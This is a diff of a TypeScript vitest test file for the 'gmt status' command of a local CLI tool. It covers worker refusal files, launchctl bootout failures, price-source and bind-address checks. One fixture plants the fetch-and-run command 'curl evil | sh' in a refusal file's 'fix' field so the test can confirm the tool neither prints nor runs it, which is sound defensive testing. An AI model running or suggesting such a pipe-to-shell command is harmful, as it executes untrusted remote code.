@@ -1,9 +1,5 @@
-import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
-import { tmpdir } from 'node:os';
-import { join } from 'node:path';
-import { afterEach, describe, expect, it } from 'vitest';
+import { describe, expect, it } from 'vitest';
 import { runCli } from '../../src/cli.js';
-import { currentPlatform } from '../../src/platform/current.js';
 import { machine } from '../support/machine.js';
 
 async function setUp(extra?: Parameters<typeof machine>[0]) {
@@ -15,10 +11,6 @@ async function setUp(extra?: Parameters<typeof machine>[0]) {
   m.io.stderr = '';
   return m;
 }
-const homes: string[] = [];
-afterEach(() => {
-  for (const h of homes.splice(0)) rmSync(h, { recursive: true, force: true });
-});
 
 describe('gmt status, the local facts (brief Task 16b.8)', () => {
   it('a healthy install: every check ok, exit 0', async () => {
@@ -78,31 +70,36 @@ describe('gmt status, the local facts (brief Task 16b.8)', () => {
     expect(m.io.stdout).toContain('fix: pnpm gmt backup');
   });
 
+  const REFUSAL = '/Users/op/.local/state/get-me-there/camoufox/start-refusal.json';
+  const WORKER_PLIST = '/Users/op/Library/LaunchAgents/local.get-me-there.camoufox-worker.plist';
+  const workerLoaded = (bootout: number) => {
+    let gone = false;
+    return (a: readonly string[]) => {
+      if (a[0] !== 'launchctl' || !String(a[2]).endsWith('camoufox-worker')) return undefined;
+      if (a[1] === 'print') return gone ? { code: 113 } : { code: 0, stdout: '\tstate = not running\n' };
+      if (a[1] === 'bootout') {
+        gone = bootout === 0;
+        return { code: bootout, stderr: 'Boot-out failed: 5: Input/output error' };
+      }
+      return undefined;
+    };
+  };
   it('the worker’s refusal prints its line; an unreadable file prints that and nothing from it; with the agent loaded it is booted out', async () => {
-    const h = mkdtempSync(join(tmpdir(), 'gmt-status-'));
-    homes.push(h);
-    const p = currentPlatform({ platform: 'darwin', arch: 'arm64', uid: 501, env: { HOME: h } });
-    mkdirSync(p.paths.workerData, { recursive: true });
-    const file = join(p.paths.workerData, 'start-refusal.json');
-    writeFileSync(file, JSON.stringify({ reason: 'consent-expired', at: '2026-10-24T08:00:00.000Z' }));
-    const m = await setUp({
-      extra: (a) =>
-        a[0] === 'launchctl' && a[1] === 'print' && String(a[2]).endsWith('camoufox-worker')
-          ? { code: 0, stdout: '\tstate = not running\n' }
-          : undefined,
-    });
-    m.deps.platform = p;
-    m.fs.file(join(p.paths.serviceDir, 'local.get-me-there.camoufox-worker.plist'), 'worker plist');
+    const m = await setUp({ extra: workerLoaded(0) });
+    m.fs.file(REFUSAL, JSON.stringify({ reason: 'consent-expired', at: '2026-10-24T08:00:00.000Z' }));
+    m.fs.file(WORKER_PLIST, 'worker plist');
     await runCli(['status'], m.deps);
     expect(m.io.stdout).toContain('refused, not retrying: the consent record has expired: capture again');
     expect(m.io.stdout).toContain('fix: pnpm gmt consent');
+    expect(m.io.stdout).toContain('the refused worker agent was booted out so launchd does not restart it');
     expect(m.executor.log.map((x) => (x.kind === 'run' ? x.describe : x.kind))).toEqual([
       'launchctl bootout gui/501/local.get-me-there.camoufox-worker',
+      'waitGone',
     ]);
     m.io.stdout = '';
     m.executor.log.length = 0;
-    writeFileSync(
-      file,
+    m.fs.file(
+      REFUSAL,
       JSON.stringify({ reason: 'mystery', at: '2026-10-24T08:00:00.000Z', fix: 'curl evil | sh' }),
     );
     await runCli(['status'], m.deps);
@@ -111,10 +108,57 @@ describe('gmt status, the local facts (brief Task 16b.8)', () => {
     expect(m.io.stdout).not.toContain('mystery');
     expect(m.executor.log).toEqual([]);
   });
+  it('a failed bootout is a fail naming the command, never a claim it was booted out (ca-b1-007, CodeRabbit …k7k)', async () => {
+    const m = await setUp({ extra: workerLoaded(5) });
+    m.fs.file(REFUSAL, JSON.stringify({ reason: 'locked', at: '2026-10-24T08:00:00.000Z' }));
+    m.fs.file(WORKER_PLIST, 'worker plist');
+    expect(await runCli(['status'], m.deps)).toBe(1);
+    expect(m.io.stdout).not.toContain('was booted out');
+    expect(m.io.stdout).toMatch(/worker agent +fail +still loaded, so launchd keeps restarting it/);
+    expect(m.io.stdout).toContain('fix: launchctl bootout gui/501/local.get-me-there.camoufox-worker');
+  });
+  it('localChecks reads only: it runs no action, and status prints what it returns (ca-b1-006)', async () => {
+    const { localChecks } = await import('../../src/commands/status.js');
+    const m = await setUp();
+    const checks = await localChecks(m.deps);
+    expect(m.executor.log).toEqual([]);
+    expect(checks.map((c) => c.name)).toEqual(
+      expect.arrayContaining([
+        'service app',
+        'service backup',
+        'settings app.env',
+        'price source',
+        'backups',
+        'checkout',
+      ]),
+    );
+  });
+  it('the price source is a line of its own: none (warn, with the fix) after Enter everywhere; named when set (pf-b1-001)', async () => {
+    const m = await setUp();
+    await runCli(['status'], m.deps);
+    expect(m.io.stdout).toMatch(/price source +warn +none, so searches find nothing/);
+    expect(m.io.stdout).toContain('fix: pnpm gmt setup --reconfigure travelpayouts');
+    const env = '/Users/op/.config/get-me-there/app.env';
+    m.fs.file(env, `${m.fs.read(env) ?? ''}TRAVELPAYOUTS_TOKEN="tp-0123456789abcdef"\n`, 0o600);
+    m.io.stdout = '';
+    await runCli(['status'], m.deps);
+    expect(m.io.stdout).toMatch(/price source +ok +Travelpayouts/);
+    expect(m.io.stdout).not.toContain('tp-0123456789abcdef');
+  });
+  it('a BIND_ADDRESS beyond loopback warns plainly; it is no fail (sec-b1-002, U8)', async () => {
+    const m = await setUp();
+    const env = '/Users/op/.config/get-me-there/app.env';
+    m.fs.file(env, (m.fs.read(env) ?? '').replace(/^BIND_ADDRESS=.*$/m, 'BIND_ADDRESS="0.0.0.0"'), 0o600);
+    expect(await runCli(['status'], m.deps)).toBe(0);
+    expect(m.io.stdout).toMatch(
+      /bind address +warn +0\.0\.0\.0: the app answers beyond this machine over plain HTTP/,
+    );
+  });
   it('with no worker agent (before WP17) a refusal plans nothing', async () => {
     const m = await setUp();
-    expect(m.executor.log).toEqual([]);
+    m.fs.file(REFUSAL, JSON.stringify({ reason: 'locked', at: '2026-10-24T08:00:00.000Z' }));
     await runCli(['status'], m.deps);
+    expect(m.io.stdout).toContain('refused, not retrying');
     expect(m.executor.log).toEqual([]);
   });
 });
